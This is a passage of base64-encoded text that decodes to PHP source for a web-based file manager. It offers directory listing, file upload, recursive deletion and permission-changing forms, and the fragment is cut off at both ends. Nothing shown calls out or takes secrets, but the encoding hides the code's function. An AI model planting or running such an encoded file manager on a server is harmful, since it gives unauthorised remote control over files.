YW1lPSJvciIgdmFsdWU9IjEiJzsgaWYgKCRtb2RlICYgMDAwMDQpIGVjaG8gJyBjaGVja2VkPSJjaGVja2VkIic7IGVjaG8gJyAvPjwvdGQ+DQoJPC90cj4NCgk8dHI+DQoJCTx0ZCBzdHlsZT0idGV4dC1hbGlnbjogcmlnaHQiPicgLiB3b3JkKCd3cml0ZScpIC4gJzo8L3RkPg0KCQk8dGQ+PGlucHV0IHR5cGU9ImNoZWNrYm94IiBuYW1lPSJ1dyIgdmFsdWU9IjEiJzsgaWYgKCRtb2RlICYgMDAyMDApIGVjaG8gJyBjaGVja2VkPSJjaGVja2VkIic7IGVjaG8gJyAvPjwvdGQ+DQoJCTx0ZD48aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9Imd3IiB2YWx1ZT0iMSInOyBpZiAoJG1vZGUgJiAwMDAyMCkgZWNobyAnIGNoZWNrZWQ9ImNoZWNrZWQiJzsgZWNobyAnIC8+PC90ZD4NCgkJPHRkPjxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0ib3ciIHZhbHVlPSIxIic7IGlmICgkbW9kZSAmIDAwMDAyKSBlY2hvICcgY2hlY2tlZD0iY2hlY2tlZCInOyBlY2hvICcgLz48L3RkPg0KCTwvdHI+DQoJPHRyPg0KCQk8dGQgc3R5bGU9InRleHQtYWxpZ246IHJpZ2h0Ij4nIC4gd29yZCgnZXhlY3V0ZScpIC4gJzo8L3RkPg0KCQk8dGQ+PGlucHV0IHR5cGU9ImNoZWNrYm94IiBuYW1lPSJ1eCIgdmFsdWU9IjEiJzsgaWYgKCRtb2RlICYgMDAxMDApIGVjaG8gJyBjaGVja2VkPSJjaGVja2VkIic7IGVjaG8gJyAvPjwvdGQ+DQoJCTx0ZD48aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9Imd4IiB2YWx1ZT0iMSInOyBpZiAoJG1vZGUgJiAwMDAxMCkgZWNobyAnIGNoZWNrZWQ9ImNoZWNrZWQiJzsgZWNobyAnIC8+PC90ZD4NCgkJPHRkPjxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0ib3giIHZhbHVlPSIxIic7IGlmICgkbW9kZSAmIDAwMDAxKSBlY2hvICcgY2hlY2tlZD0iY2hlY2tlZCInOyBlY2hvICcgLz48L3RkPg0KCTwvdHI+DQoJPC90YWJsZT4NCg0KCTxociAvPg0KDQoJPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0ic2V0IiB2YWx1ZT0iJyAuIHdvcmQoJ3NldCcpIC4gJyIgLz4NCg0KCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImFjdGlvbiIgdmFsdWU9InBlcm1pc3Npb24iIC8+DQoJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZmlsZSIgdmFsdWU9IicgLiBodG1sKCRmaWxlKSAuICciIC8+DQoJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZGlyIiB2YWx1ZT0iJyAuIGh0bWwoJGRpcmVjdG9yeSkgLiAnIiAvPg0KDQo8L3RkPg0KPC90cj4NCjwvdGFibGU+DQoNCjxwPjxhIGhyZWY9IicgLiAkc2VsZiAuICc/ZGlyPScgLiB1cmxlbmNvZGUoJGRpcmVjdG9yeSkgLiAnIj5bICcgLiB3b3JkKCdiYWNrJykgLiAnIF08L2E+PC9wPg0KDQo8L2Zvcm0+DQoNCic7DQoNCgkJaHRtbF9mb290ZXIoKTsNCg0KCX0NCg0KCWJyZWFrOw0KDQpkZWZhdWx0Og0KDQoJbGlzdGluZ19wYWdlKCk7DQoNCn0NCg0KLyogLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSAqLw0KDQpmdW5jdGlvbiBnZXRsaXN0ICgkZGlyZWN0b3J5KSB7DQoJZ2xvYmFsICRkZWxpbSwgJHdpbjsNCg0KCWlmICgkZCA9IEBvcGVuZGlyKCRkaXJlY3RvcnkpKSB7DQoNCgkJd2hpbGUgKCgkZmlsZW5hbWUgPSBAcmVhZGRpcigkZCkpICE9PSBmYWxzZSkgew0KDQoJCQkkcGF0aCA9ICRkaXJlY3RvcnkgLiAkZmlsZW5hbWU7DQoNCgkJCWlmICgkc3RhdCA9IEBsc3RhdCgkcGF0aCkpIHsNCg0KCQkJCSRmaWxlID0gYXJyYXkoDQoJCQkJCSdmaWxlbmFtZScgICAgPT4gJGZpbGVuYW1lLA0KCQkJCQkncGF0aCcgICAgICAgID0+ICRwYXRoLA0KCQkJCQknaXNfZmlsZScgICAgID0+IEBpc19maWxlKCRwYXRoKSwNCgkJCQkJJ2lzX2RpcicgICAgICA9PiBAaXNfZGlyKCRwYXRoKSwNCgkJCQkJJ2lzX2xpbmsnICAgICA9PiBAaXNfbGluaygkcGF0aCksDQoJCQkJCSdpc19yZWFkYWJsZScgPT4gQGlzX3JlYWRhYmxlKCRwYXRoKSwNCgkJCQkJJ2lzX3dyaXRhYmxlJyA9PiBAaXNfd3JpdGFibGUoJHBhdGgpLA0KCQkJCQknc2l6ZScgICAgICAgID0+ICRzdGF0WydzaXplJ10sDQoJCQkJCSdwZXJtaXNzaW9uJyAgPT4gJHN0YXRbJ21vZGUnXSwNCgkJCQkJJ293bmVyJyAgICAgICA9PiAkc3RhdFsndWlkJ10sDQoJCQkJCSdncm91cCcgICAgICAgPT4gJHN0YXRbJ2dpZCddLA0KCQkJCQknbXRpbWUnICAgICAgID0+IEBmaWxlbXRpbWUoJHBhdGgpLA0KCQkJCQknYXRpbWUnICAgICAgID0+IEBmaWxlYXRpbWUoJHBhdGgpLA0KCQkJCQknY3RpbWUnICAgICAgID0+IEBmaWxlY3RpbWUoJHBhdGgpDQoJCQkJKTsNCg0KCQkJCWlmICgkZmlsZVsnaXNfZGlyJ10pIHsNCgkJCQkJJGZpbGVbJ2lzX2V4ZWN1dGFibGUnXSA9IEBmaWxlX2V4aXN0cygkcGF0aCAuICRkZWxpbSAuICcuJyk7DQoJCQkJfSBlbHNlIHsNCgkJCQkJaWYgKCEkd2luKSB7DQoJCQkJCQkkZmlsZVsnaXNfZXhlY3V0YWJsZSddID0gQGlzX2V4ZWN1dGFibGUoJHBhdGgpOw0KCQkJCQl9IGVsc2Ugew0KCQkJCQkJJGZpbGVbJ2lzX2V4ZWN1dGFibGUnXSA9IHRydWU7DQoJCQkJCX0NCgkJCQl9DQoNCgkJCQlpZiAoJGZpbGVbJ2lzX2xpbmsnXSkgJGZpbGVbJ3RhcmdldCddID0gQHJlYWRsaW5rKCRwYXRoKTsNCg0KCQkJCWlmIChmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldHB3dWlkJykpICRmaWxlWydvd25lcl9uYW1lJ10gPSBAcmVzZXQocG9zaXhfZ2V0cHd1aWQoJGZpbGVbJ293bmVyJ10pKTsNCgkJCQlpZiAoZnVuY3Rpb25fZXhpc3RzKCdwb3NpeF9nZXRncmdpZCcpKSAkZmlsZVsnZ3JvdXBfbmFtZSddID0gQHJlc2V0KHBvc2l4X2dldGdyZ2lkKCRmaWxlWydncm91cCddKSk7DQoNCgkJCQkkZmlsZXNbXSA9ICRmaWxlOw0KDQoJCQl9DQoNCgkJfQ0KDQoJCXJldHVybiAkZmlsZXM7DQoNCgl9IGVsc2Ugew0KCQlyZXR1cm4gZmFsc2U7DQoJfQ0KDQp9DQoNCmZ1bmN0aW9uIHNvcnRsaXN0ICgmJGxpc3QsICRrZXksICRyZXZlcnNlKSB7DQoNCglxdWlja3NvcnQoJGxpc3QsIDAsIHNpemVvZigkbGlzdCkgLSAxLCAka2V5KTsNCg0KCWlmICgkcmV2ZXJzZSkgJGxpc3QgPSBhcnJheV9yZXZlcnNlKCRsaXN0KTsNCg0KfQ0KDQpmdW5jdGlvbiBxdWlja3NvcnQgKCYkYXJyYXksICRmaXJzdCwgJGxhc3QsICRrZXkpIHsNCg0KCWlmICgkZmlyc3QgPCAkbGFzdCkgew0KDQoJCSRjbXAgPSAkYXJyYXlbZmxvb3IoKCRmaXJzdCArICRsYXN0KSAvIDIpXVska2V5XTsNCg0KCQkkbCA9ICRmaXJzdDsNCgkJJHIgPSAkbGFzdDsNCg0KCQl3aGlsZSAoJGwgPD0gJHIpIHsNCg0KCQkJd2hpbGUgKCRhcnJheVskbF1bJGtleV0gPCAkY21wKSAkbCsrOw0KCQkJd2hpbGUgKCRhcnJheVskcl1bJGtleV0gPiAkY21wKSAkci0tOw0KDQoJCQlpZiAoJGwgPD0gJHIpIHsNCg0KCQkJCSR0bXAgPSAkYXJyYXlbJGxdOw0KCQkJCSRhcnJheVskbF0gPSAkYXJyYXlbJHJdOw0KCQkJCSRhcnJheVskcl0gPSAkdG1wOw0KDQoJCQkJJGwrKzsNCgkJCQkkci0tOw0KDQoJCQl9DQoNCgkJfQ0KDQoJCXF1aWNrc29ydCgkYXJyYXksICRmaXJzdCwgJHIsICRrZXkpOw0KCQlxdWlja3NvcnQoJGFycmF5LCAkbCwgJGxhc3QsICRrZXkpOw0KDQoJfQ0KDQp9DQoNCmZ1bmN0aW9uIHBlcm1pc3Npb25fb2N0YWwyc3RyaW5nICgkbW9kZSkgew0KDQoJaWYgKCgkbW9kZSAmIDB4QzAwMCkgPT09IDB4QzAwMCkgew0KCQkkdHlwZSA9ICdzJzsNCgl9IGVsc2VpZiAoKCRtb2RlICYgMHhBMDAwKSA9PT0gMHhBMDAwKSB7DQoJCSR0eXBlID0gJ2wnOw0KCX0gZWxzZWlmICgoJG1vZGUgJiAweDgwMDApID09PSAweDgwMDApIHsNCgkJJHR5cGUgPSAnLSc7DQoJfSBlbHNlaWYgKCgkbW9kZSAmIDB4NjAwMCkgPT09IDB4NjAwMCkgew0KCQkkdHlwZSA9ICdiJzsNCgl9IGVsc2VpZiAoKCRtb2RlICYgMHg0MDAwKSA9PT0gMHg0MDAwKSB7DQoJCSR0eXBlID0gJ2QnOw0KCX0gZWxzZWlmICgoJG1vZGUgJiAweDIwMDApID09PSAweDIwMDApIHsNCgkJJHR5cGUgPSAnYyc7DQoJfSBlbHNlaWYgKCgkbW9kZSAmIDB4MTAwMCkgPT09IDB4MTAwMCkgew0KCQkkdHlwZSA9ICdwJzsNCgl9IGVsc2Ugew0KCQkkdHlwZSA9ICc/JzsNCgl9DQoNCgkkb3duZXIgID0gKCRtb2RlICYgMDA0MDApID8gJ3InIDogJy0nOw0KCSRvd25lciAuPSAoJG1vZGUgJiAwMDIwMCkgPyAndycgOiAnLSc7DQoJaWYgKCRtb2RlICYgMHg4MDApIHsNCgkJJG93bmVyIC49ICgkbW9kZSAmIDAwMTAwKSA/ICdzJyA6ICdTJzsNCgl9IGVsc2Ugew0KCQkkb3duZXIgLj0gKCRtb2RlICYgMDAxMDApID8gJ3gnIDogJy0nOw0KCX0NCg0KCSRncm91cCAgPSAoJG1vZGUgJiAwMDA0MCkgPyAncicgOiAnLSc7DQoJJGdyb3VwIC49ICgkbW9kZSAmIDAwMDIwKSA/ICd3JyA6ICctJzsNCglpZiAoJG1vZGUgJiAweDQwMCkgew0KCQkkZ3JvdXAgLj0gKCRtb2RlICYgMDAwMTApID8gJ3MnIDogJ1MnOw0KCX0gZWxzZSB7DQoJCSRncm91cCAuPSAoJG1vZGUgJiAwMDAxMCkgPyAneCcgOiAnLSc7DQoJfQ0KDQoJJG90aGVyICA9ICgkbW9kZSAmIDAwMDA0KSA/ICdyJyA6ICctJzsNCgkkb3RoZXIgLj0gKCRtb2RlICYgMDAwMDIpID8gJ3cnIDogJy0nOw0KCWlmICgkbW9kZSAmIDB4MjAwKSB7DQoJCSRvdGhlciAuPSAoJG1vZGUgJiAwMDAwMSkgPyAndCcgOiAnVCc7DQoJfSBlbHNlIHsNCgkJJG90aGVyIC49ICgkbW9kZSAmIDAwMDAxKSA/ICd4JyA6ICctJzsNCgl9DQoNCglyZXR1cm4gJHR5cGUgLiAkb3duZXIgLiAkZ3JvdXAgLiAkb3RoZXI7DQoNCn0NCg0KZnVuY3Rpb24gaXNfc2NyaXB0ICgkZmlsZW5hbWUpIHsNCglyZXR1cm4gZXJlZygnXC5waHAkfFwucGhwMyR8XC5waHA0JHxcLnBocDUkJywgJGZpbGVuYW1lKTsNCn0NCg0KZnVuY3Rpb24gZ2V0bWltZXR5cGUgKCRmaWxlbmFtZSkgew0KCXN0YXRpYyAkbWltZXMgPSBhcnJheSgNCgkJJ1wuanBnJHxcLmpwZWckJyAgPT4gJ2ltYWdlL2pwZWcnLA0KCQknXC5naWYkJyAgICAgICAgICA9PiAnaW1hZ2UvZ2lmJywNCgkJJ1wucG5nJCcgICAgICAgICAgPT4gJ2ltYWdlL3BuZycsDQoJCSdcLmh0bWwkfFwuaHRtbCQnID0+ICd0ZXh0L2h0bWwnLA0KCQknXC50eHQkfFwuYXNjJCcgICA9PiAndGV4dC9wbGFpbicsDQoJCSdcLnhtbCR8XC54c2wkJyAgID0+ICdhcHBsaWNhdGlvbi94bWwnLA0KCQknXC5wZGYkJyAgICAgICAgICA9PiAnYXBwbGljYXRpb24vcGRmJw0KCSk7DQoNCglmb3JlYWNoICgkbWltZXMgYXMgJHJlZ2V4ID0+ICRtaW1lKSB7DQoJCWlmIChlcmVnaSgkcmVnZXgsICRmaWxlbmFtZSkpIHJldHVybiAkbWltZTsNCgl9DQoNCgkvLyByZXR1cm4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbSc7DQoJcmV0dXJuICd0ZXh0L3BsYWluJzsNCg0KfQ0KDQpmdW5jdGlvbiBkZWwgKCRmaWxlKSB7DQoJZ2xvYmFsICRkZWxpbTsNCg0KCWlmICghQGlzX2xpbmsoJGZpbGUpICYmICFmaWxlX2V4aXN0cygkZmlsZSkpIHJldHVybiBmYWxzZTsNCg0KCWlmICghQGlzX2xpbmsoJGZpbGUpICYmIEBpc19kaXIoJGZpbGUpKSB7DQoNCgkJaWYgKCRkaXIgPSBAb3BlbmRpcigkZmlsZSkpIHsNCg0KCQkJJGVycm9yID0gZmFsc2U7DQoNCgkJCXdoaWxlICgoJGYgPSByZWFkZGlyKCRkaXIpKSAhPT0gZmFsc2UpIHsNCgkJCQlpZiAoJGYgIT0gJy4nICYmICRmICE9ICcuLicgJiYgIWRlbCgkZmlsZSAuICRkZWxpbSAuICRmKSkgew0KCQkJCQkkZXJyb3IgPSB0cnVlOw0KCQkJCX0NCgkJCX0NCgkJCWNsb3NlZGlyKCRkaXIpOw0KDQoJCQlpZiAoISRlcnJvcikgcmV0dXJuIEBybWRpcigkZmlsZSk7DQoNCgkJCXJldHVybiAhJGVycm9yOw0KDQoJCX0gZWxzZSB7DQoJCQlyZXR1cm4gZmFsc2U7DQoJCX0NCg0KCX0gZWxzZSB7DQoJCXJldHVybiBAdW5saW5rKCRmaWxlKTsNCgl9DQoNCn0NCg0KZnVuY3Rpb24gYWRkc2xhc2ggKCRkaXJlY3RvcnkpIHsNCglnbG9iYWwgJGRlbGltOw0KDQoJaWYgKHN1YnN0cigkZGlyZWN0b3J5LCAtMSwgMSkgIT0gJGRlbGltKSB7DQoJCXJldHVybiAkZGlyZWN0b3J5IC4gJGRlbGltOw0KCX0gZWxzZSB7DQoJCXJldHVybiAkZGlyZWN0b3J5Ow0KCX0NCg0KfQ0KDQpmdW5jdGlvbiByZWxhdGl2ZTJhYnNvbHV0ZSAoJHN0cmluZywgJGRpcmVjdG9yeSkgew0KDQoJaWYgKHBhdGhfaXNfcmVsYXRpdmUoJHN0cmluZykpIHsNCgkJcmV0dXJuIHNpbXBsaWZ5X3BhdGgoYWRkc2xhc2goJGRpcmVjdG9yeSkgLiAkc3RyaW5nKTsNCgl9IGVsc2Ugew0KCQlyZXR1cm4gc2ltcGxpZnlfcGF0aCgkc3RyaW5nKTsNCgl9DQoNCn0NCg0KZnVuY3Rpb24gcGF0aF9pc19yZWxhdGl2ZSAoJHBhdGgpIHsNCglnbG9iYWwgJHdpbjsNCg0KCWlmICgkd2luKSB7DQoJCXJldHVybiAoc3Vic3RyKCRwYXRoLCAxLCAxKSAhPSAnOicpOw0KCX0gZWxzZSB7DQoJCXJldHVybiAoc3Vic3RyKCRwYXRoLCAwLCAxKSAhPSAnLycpOw0KCX0NCg0KfQ0KDQpmdW5jdGlvbiBhYnNvbHV0ZTJyZWxhdGl2ZSAoJGRpcmVjdG9yeSwgJHRhcmdldCkgew0KCWdsb2JhbCAkZGVsaW07DQoNCgkkcGF0aCA9ICcnOw0KCXdoaWxlICgkZGlyZWN0b3J5ICE9ICR0YXJnZXQpIHsNCgkJaWYgKCRkaXJlY3RvcnkgPT0gc3Vic3RyKCR0YXJnZXQsIDAsIHN0cmxlbigkZGlyZWN0b3J5KSkpIHsNCgkJCSRwYXRoIC49IHN1YnN0cigkdGFyZ2V0LCBzdHJsZW4oJGRpcmVjdG9yeSkpOw0KCQkJYnJlYWs7DQoJCX0gZWxzZSB7DQoJCQkkcGF0aCAuPSAnLi4nIC4gJGRlbGltOw0KCQkJJGRpcmVjdG9yeSA9IHN1YnN0cigkZGlyZWN0b3J5LCAwLCBzdHJycG9zKHN1YnN0cigkZGlyZWN0b3J5LCAwLCAtMSksICRkZWxpbSkgKyAxKTsNCgkJfQ0KCX0NCglpZiAoJHBhdGggPT0gJycpICRwYXRoID0gJy4nOw0KDQoJcmV0dXJuICRwYXRoOw0KDQp9DQoNCmZ1bmN0aW9uIHNpbXBsaWZ5X3BhdGggKCRwYXRoKSB7DQoJZ2xvYmFsICRkZWxpbTsNCg0KCWlmIChAZmlsZV9leGlzdHMoJHBhdGgpICYmIGZ1bmN0aW9uX2V4aXN0cygncmVhbHBhdGgnKSAmJiBAcmVhbHBhdGgoJHBhdGgpICE9ICcnKSB7DQoJCSRwYXRoID0gcmVhbHBhdGgoJHBhdGgpOw0KCQlpZiAoQGlzX2RpcigkcGF0aCkpIHsNCgkJCXJldHVybiBhZGRzbGFzaCgkcGF0aCk7DQoJCX0gZWxzZSB7DQoJCQlyZXR1cm4gJHBhdGg7DQoJCX0NCgl9DQoNCgkkcGF0dGVybiAgPSAkZGVsaW0gLiAnLicgLiAkZGVsaW07DQoNCglpZiAoQGlzX2RpcigkcGF0aCkpIHsNCgkJJHBhdGggPSBhZGRzbGFzaCgkcGF0aCk7DQoJfQ0KDQoJd2hpbGUgKHN0cnBvcygkcGF0aCwgJHBhdHRlcm4pICE9PSBmYWxzZSkgew0KCQkkcGF0aCA9IHN0cl9yZXBsYWNlKCRwYXR0ZXJuLCAkZGVsaW0sICRwYXRoKTsNCgl9DQoNCgkkZSA9IGFkZHNsYXNoZXMoJGRlbGltKTsNCgkkcmVnZXggPSAkZSAuICcoKFwuW15cLicgLiAkZSAuICddW14nIC4gJGUgLiAnXSopfChcLlwuW14nIC4gJGUgLiAnXSspfChbXlwuXVteJyAuICRlIC4gJ10qKSknIC4gJGUgLiAnXC5cLicgLiAkZTsNCg0KCXdoaWxlIChlcmVnKCRyZWdleCwgJHBhdGgpKSB7DQoJCSRwYXRoID0gZXJlZ19yZXBsYWNlKCRyZWdleCwgJGRlbGltLCAkcGF0aCk7DQoJfQ0KCQ0KCXJldHVybiAkcGF0aDsNCg0KfQ0KDQpmdW5jdGlvbiBodW1hbl9maWxlc2l6ZSAoJGZpbGVzaXplKSB7DQoNCgkkc3VmZmljZXMgPSAna01HVFBFJzsNCg0KCSRuID0gMDsNCgl3aGlsZSAoJGZpbGVzaXplID49IDEwMDApIHsNCgkJJGZpbGVzaXplIC89IDEwMjQ7DQoJCSRuKys7DQoJfQ0KDQoJJGZpbGVzaXplID0gcm91bmQoJGZpbGVzaXplLCAzIC0gc3RycG9zKCRmaWxlc2l6ZSwgJy4nKSk7DQoNCglpZiAoc3RycG9zKCRmaWxlc2l6ZSwgJy4nKSAhPT0gZmFsc2UpIHsNCgkJd2hpbGUgKGluX2FycmF5KHN1YnN0cigkZmlsZXNpemUsIC0xLCAxKSwgYXJyYXkoJzAnLCAnLicpKSkgew0KCQkJJGZpbGVzaXplID0gc3Vic3RyKCRmaWxlc2l6ZSwgMCwgc3RybGVuKCRmaWxlc2l6ZSkgLSAxKTsNCgkJfQ0KCX0NCg0KCSRzdWZmaXggPSAoKCRuID09IDApID8gJycgOiBzdWJzdHIoJHN1ZmZpY2VzLCAkbiAtIDEsIDEpKTsNCg0KCXJldHVybiAkZmlsZXNpemUgLiAiIHskc3VmZml4fUIiOw0KDQp9DQoNCmZ1bmN0aW9uIHN0cmlwICgmJHN0cikgew0KCSRzdHIgPSBzdHJpcHNsYXNoZXMoJHN0cik7DQp9DQoNCi8qIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gKi8NCg0KZnVuY3Rpb24gbGlzdGluZ19wYWdlICgkbWVzc2FnZSA9IG51bGwpIHsNCglnbG9iYWwgJHNlbGYsICRkaXJlY3RvcnksICRzb3J0LCAkcmV2ZXJzZTsNCg0KCWh0bWxfaGVhZGVyKCk7DQoNCgkkbGlzdCA9IGdldGxpc3QoJGRpcmVjdG9yeSk7DQoNCglpZiAoYXJyYXlfa2V5X2V4aXN0cygnc29ydCcsICRfR0VUKSkgJHNvcnQgPSAkX0dFVFsnc29ydCddOyBlbHNlICRzb3J0ID0gJ2ZpbGVuYW1lJzsNCglpZiAoYXJyYXlfa2V5X2V4aXN0cygncmV2ZXJzZScsICRfR0VUKSAmJiAkX0dFVFsncmV2ZXJzZSddID09ICd0cnVlJykgJHJldmVyc2UgPSB0cnVlOyBlbHNlICRyZXZlcnNlID0gZmFsc2U7DQoNCglzb3J0bGlzdCgkbGlzdCwgJHNvcnQsICRyZXZlcnNlKTsNCg0KCWVjaG8gJw0KDQo8Zm9ybSBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBhY3Rpb249IicgLiAkc2VsZiAuICciIG1ldGhvZD0icG9zdCI+DQoNCjx0YWJsZSBpZD0ibWFpbiI+DQonOw0KDQoJZGlyZWN0b3J5X2Nob2ljZSgpOw0KDQoJaWYgKCFlbXB0eSgkbWVzc2FnZSkpIHsNCgkJc3BhY2VyKCk7DQoJCWVjaG8gJG1lc3NhZ2U7DQoJfQ0KDQoJaWYgKEBpc193cml0YWJsZSgkZGlyZWN0b3J5KSkgew0KCQl1cGxvYWRfYm94KCk7DQoJCWNyZWF0ZV9ib3goKTsNCgl9IGVsc2Ugew0KCQlzcGFjZXIoKTsNCgl9DQoNCglpZiAoJGxpc3QpIHsNCgkJbGlzdGluZygkbGlzdCk7DQoJfSBlbHNlIHsNCgkJZWNobyBlcnJvcignbm90X3JlYWRhYmxlJywgJGRpcmVjdG9yeSk7DQoJfQ0KDQoJZWNobyAnPC90YWJsZT4NCg0KPC9mb3JtPg0KDQonOw0KDQoJaHRtbF9mb290ZXIoKTsNCg0KfQ0KDQpmdW5jdGlvbiBsaXN0aW5nICgkbGlzdCkgew0KCWdsb2JhbCAkZGlyZWN0b3J5LCAkaG9tZWRpciwgJHNvcnQsICRyZXZlcnNlLCAkd2luLCAkY29scywgJGRhdGVfZm9ybWF0LCAkc2VsZjsNCg0KCWVjaG8gJzx0ciBjbGFzcz0ibGlzdGluZyI+DQoJPHRoIHN0eWxlPSJ0ZXh0LWFsaWduOiBjZW50ZXI7IHZlcnRpY2FsLWFsaWduOiBtaWRkbGUiPjxpbWcgc3JjPSInIC4gJHNlbGYgLiAnP2ltYWdlPXNtaWxleSIgYWx0PSJzbWlsZXkiIC8+PC90aD4NCic7DQoNCgkkZCA9ICdkaXI9JyAuIHVybGVuY29kZSgkZGlyZWN0b3J5KSAuICcmYW1wOyc7DQoNCglpZiAoISRyZXZlcnNlICYmICRzb3J0ID09ICdmaWxlbmFtZScpICRyID0gJyZhbXA7cmV2ZXJzZT10cnVlJzsgZWxzZSAkciA9ICcnOw0KCWVjaG8gIlx0PHRoIGNsYXNzPVwiZmlsZW5hbWVcIj48YSBocmVmPVwiJHNlbGY/eyRkfXNvcnQ9ZmlsZW5hbWUkclwiPiIgLiB3b3JkKCdmaWxlbmFtZScpIC4gIjwvYT48L3RoPiI7DQoJaWYgKCEkcmV2ZXJzZSAmJiAkc29ydCA9PSAnc2l6ZScpICRyID0gJyZhbXA7cmV2ZXJzZT10cnVlJzsgZWxzZSAkciA9ICcnOw0KCWVjaG8gIlx0PHRoIGNsYXNzPVwic2l6ZVwiPjxhIGhyZWY9XCIkc2VsZj97JGR9c29ydD1zaXplJHJcIj4iIC4gd29yZCgnc2l6ZScpIC4gIjwvYT48L3RoPiI7DQppZiAoISR3aW4pIHsNCg0KCQlpZiAoISRyZXZlcnNlICYmICRzb3J0ID09ICdwZXJtaXNzaW9uJykgJHIgPSAnJmFtcDtyZXZlcnNlPXRydWUnOyBlbHNlICRyID0gJyc7DQoJCWVjaG8gIlx0PHRoIGNsYXNzPVwicGVybWlzc2lvbl9oZWFkZXJcIj48YSBocmVmPVwiJHNlbGY/eyRkfXNvcnQ9cGVybWlzc2lvbiRyXCI+IiAuIHdvcmQoJ3Blcm1pc3Npb24nKSAuICI8L2E+PC90aD4iOw0KCQlpZiAoISRyZXZlcnNlICYmICRzb3J0ID09ICdvd25lcicpICRyID0gJyZhbXA7cmV2ZXJzZT10cnVlJzsgZWxzZSAkciA9ICcnOw0KCQllY2hvICJcdDx0aCBjbGFzcz1cIm93bmVyXCI+PGEgaHJlZj1cIiRzZWxmP3skZH1zb3J0PW93bmVyJHJcIj4iIC4gd29yZCgnb3duZXInKSAuICI8L2E+PC90aD4iOw0KCQlpZiAoISRyZXZlcnNlICYmICRzb3J0ID09ICdncm91cCcpICRyID0gJyZhbXA7cmV2ZXJzZT10cnVlJzsgZWxzZSAkciA9ICcnOw0KCQllY2hvICJcdDx0aCBjbGFzcz1cImdyb3VwXCI+PGEgaHJlZj1cIiRzZWxmP3skZH1zb3J0PWdyb3VwJHJcIj4iIC4gd29yZCgnZ3JvdXAnKSAuICI8L2E+PC90aD4iOw0KCX0NCgllY2hvICcJPHRoIGNsYXNzPSJmdW5jdGlvbnMiPicgLiB3b3JkKCdmdW5jdGlvbnMnKSAuICc8L3RoPg0KPC90cj4NCic7DQoNCglmb3IgKCRpID0gMDsgJGkgPCBzaXplb2YoJGxpc3QpOyAkaSsrKSB7DQoJCSRmaWxlID0gJGxpc3RbJGldOw0KDQoJCSR0aW1lc3RhbXBzICA9ICdtdGltZTogJyAuIGRhdGUoJGRhdGVfZm9ybWF0LCAkZmlsZVsnbXRpbWUnXSkgLiAnLCAnOw0KCQkkdGltZXN0YW1wcyAuPSAnYXRpbWU6ICcgLiBkYXRlKCRkYXRlX2Zvcm1hdCwgJGZpbGVbJ2F0aW1lJ10pIC4gJywgJzsNCgkJJHRpbWVzdGFtcHMgLj0gJ2N0aW1lOiAnIC4gZGF0ZSgkZGF0ZV9mb3JtYXQsICRmaWxlWydjdGltZSddKTsNCg0KCQllY2hvICc8dHIgY2xhc3M9Imxpc3RpbmciPg0KCTx0ZCBjbGFzcz0iY2hlY2tib3giPjxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0iY2hlY2tlZCcgLiAkaSAuICciIHZhbHVlPSJ0cnVlIiBvbmZvY3VzPSJhY3RpdmF0ZShcJ290aGVyXCcpIiAvPjwvdGQ+DQoJPHRkIGNsYXNzPSJmaWxlbmFtZSIgdGl0bGU9IicgLiBodG1sKCR0aW1lc3RhbXBzKSAuICciPic7DQoNCgkJaWYgKCRmaWxlWydpc19saW5rJ10pIHsNCg0KCQkJZWNobyAnPGltZyBzcmM9IicgLiAkc2VsZiAuICc/aW1hZ2U9bGluayIgYWx0PSJsaW5rIiAvPiAnOw0KCQkJZWNobyBodG1sKCRmaWxlWydmaWxlbmFtZSddKSAuICcgJnJhcnI7ICc7DQoNCgkJCSRyZWFsX2ZpbGUgPSByZWxhdGl2ZTJhYnNvbHV0ZSgkZmlsZVsndGFyZ2V0J10sICRkaXJlY3RvcnkpOw0KDQoJCQlpZiAoQGlzX3JlYWRhYmxlKCRyZWFsX2ZpbGUpKSB7DQoJCQkJaWYgKEBpc19kaXIoJHJlYWxfZmlsZSkpIHsNCgkJCQkJZWNobyAnWyA8YSBocmVmPSInIC4gJHNlbGYgLiAnP2Rpcj0nIC4gdXJsZW5jb2RlKCRyZWFsX2ZpbGUpIC4gJyI+JyAuIGh0bWwoJGZpbGVbJ3RhcmdldCddKSAuICc8L2E+IF0nOw0KCQkJCX0gZWxzZSB7DQoJCQkJCWVjaG8gJzxhIGhyZWY9IicgLiAkc2VsZiAuICc/YWN0aW9uPXZpZXcmYW1wO2ZpbGU9JyAuIHVybGVuY29kZSgkcmVhbF9maWxlKSAuICciPicgLiBodG1sKCRmaWxlWyd0YXJnZXQnXSkgLiAnPC9hPic7DQoJCQkJfQ0KCQkJfSBlbHNlIHsNCgkJCQllY2hvIGh0bWwoJGZpbGVbJ3RhcmdldCddKTsNCgkJCX0NCg0KCQl9IGVsc2VpZiAoJGZpbGVbJ2lzX2RpciddKSB7DQoNCgkJCWVjaG8gJzxpbWcgc3JjPSInIC4gJHNlbGYgLiAnP2ltYWdlPWZvbGRlciIgYWx0PSJmb2xkZXIiIC8+IFsgJzsNCgkJCWlmICgkd2luIHx8ICRmaWxlWydpc19leGVjdXRhYmxlJ10pIHsNCgkJCQllY2hvICc8YSBocmVmPSInIC4gJHNlbGYgLiAnP2Rpcj0nIC4gdXJsZW5jb2RlKCRmaWxlWydwYXRoJ10pIC4gJyI+JyAuIGh0bWwoJGZpbGVbJ2ZpbGVuYW1lJ10pIC4gJzwvYT4nOw0KCQk